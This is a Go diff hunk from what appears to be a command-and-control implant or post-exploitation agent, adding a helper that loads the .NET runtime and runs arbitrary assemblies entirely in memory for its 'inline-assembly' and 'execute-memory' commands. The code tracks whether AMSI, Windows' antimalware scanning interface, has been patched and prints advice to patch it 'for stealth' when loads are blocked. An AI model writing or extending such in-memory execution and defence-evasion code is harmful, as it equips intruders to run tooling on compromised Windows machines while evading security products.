@@ -49,6 +49,98 @@ var (
 	amsiPatched   bool // tracks whether AMSI was patched via start-clr
 )
 
+// ExecuteNETAssembly is a shared helper that executes a .NET assembly in memory
+// using the CLR hosting infrastructure. Called by both inline-assembly and execute-memory.
+// Returns (output, error). Thread-safe via assemblyMutex.
+func ExecuteNETAssembly(assemblyBytes []byte, args []string) (string, error) {
+	var sb strings.Builder
+
+	// Ensure CLR is started
+	assemblyMutex.Lock()
+	if !clrStarted {
+		sb.WriteString("[*] Auto-starting CLR v4...\n")
+
+		clr.RedirectStdoutStderr()
+
+		var loadErr error
+		for attempt := 1; attempt <= 3; attempt++ {
+			runtimeHost, loadErr = clr.LoadCLR("v4")
+			if loadErr == nil {
+				break
+			}
+			if strings.Contains(loadErr.Error(), "cannot find the file") {
+				time.Sleep(500 * time.Millisecond)
+				continue
+			}
+			break
+		}
+		if loadErr != nil {
+			assemblyMutex.Unlock()
+			return "", fmt.Errorf("CLR initialization failed: %v", loadErr)
+		}
+		clrStarted = true
+		sb.WriteString("[+] CLR started\n")
+		sb.WriteString("[!] WARNING: AMSI not patched — run 'start-clr' with Autopatch for stealth\n")
+	}
+	assemblyMutex.Unlock()
+
+	// Load assembly
+	assemblyMutex.Lock()
+	var methodInfo *clr.MethodInfo
+	var loadErr error
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				loadErr = fmt.Errorf("PANIC during LoadAssembly: %v", r)
+			}
+		}()
+		methodInfo, loadErr = clr.LoadAssembly(runtimeHost, assemblyBytes)
+	}()
+	assemblyMutex.Unlock()
+
+	if loadErr != nil {
+		errMsg := fmt.Sprintf("Load error: %v", loadErr)
+		if strings.Contains(loadErr.Error(), "0x8007000b") && !amsiPatched {
+			errMsg += " (AMSI likely blocked — run 'start-clr' with Autopatch first)"
+		}
+		return "", fmt.Errorf("%s", errMsg)
+	}
+
+	// Invoke assembly
+	assemblyMutex.Lock()
+	var stdout, stderr string
+	var invokeErr error
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				invokeErr = fmt.Errorf("PANIC during InvokeAssembly: %v", r)
+			}
+		}()
+		stdout, stderr = clr.InvokeAssembly(methodInfo, args)
+	}()
+	assemblyMutex.Unlock()
+
+	if invokeErr != nil {
+		return sb.String(), fmt.Errorf("Invoke error: %v", invokeErr)
+	}
+
+	if stdout != "" {
+		sb.WriteString(stdout)
+		if !strings.HasSuffix(stdout, "\n") {
+			sb.WriteString("\n")
+		}
+	}
+	if stderr != "" && !strings.Contains(stderr, "The system cannot find the file specified") {
+		sb.WriteString("[stderr] ")
+		sb.WriteString(stderr)
+		if !strings.HasSuffix(stderr, "\n") {
+			sb.WriteString("\n")
+		}
+	}
+
+	return sb.String(), nil
+}
+
 // InlineAssemblyCommand implements the inline-assembly command
 type InlineAssemblyCommand struct{}
 
